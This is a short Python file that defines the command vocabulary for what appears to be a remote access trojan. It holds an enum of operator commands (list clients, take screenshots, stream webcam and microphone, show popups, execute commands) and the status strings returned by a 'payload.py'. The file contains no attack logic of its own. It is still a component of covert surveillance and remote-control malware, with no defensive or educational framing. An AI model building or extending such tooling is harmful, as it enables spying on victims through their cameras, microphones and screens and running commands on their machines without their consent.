from enum import Enum


class Message(Enum):
    # existing/general commands (kept/extended)
    SHOW_HEADER = "show_header"
    SHOW_CLIENTS = "show_clients"
    ECHO = "echo"
    QUIT = "quit"
    IP = "ip"
    SEND_AT = "send_at"
    TAKE_SCREENSHOT = "take screenshot"
    TSS = "tss"
    TAKE_SNAPSHOT = "take snapshot"
    START_WEBCAM = "webcam feed"
    START_WEBCAM_SHORT = "wf"
    START_MICROPHONE = "mic feed"
    START_MICROPHONE_SHORT = "mf"
    TAKE_WEBCAM_SNAPSHOT = "take_webcam_snapshot"
    SHOW_POPUP = "popup"
    EXECUTE = "execute"

    # messages / responses / encodings used by payload.py
    TAKEN_SCREENSHOT = "Taken Screenshot"
    TAKEN_SNAPSHOT = "Taken Snapshot"
    STARTING_LIVESTREAM = "STARTING LIVESTREAM"
    STARTING_AUDIOSTREAM = "STARTING AUDIOSTREAM"
    ERROR_MSG = "[ ! ] Error while executing command."
    ENCODING_CP1252 = "Cp1252"
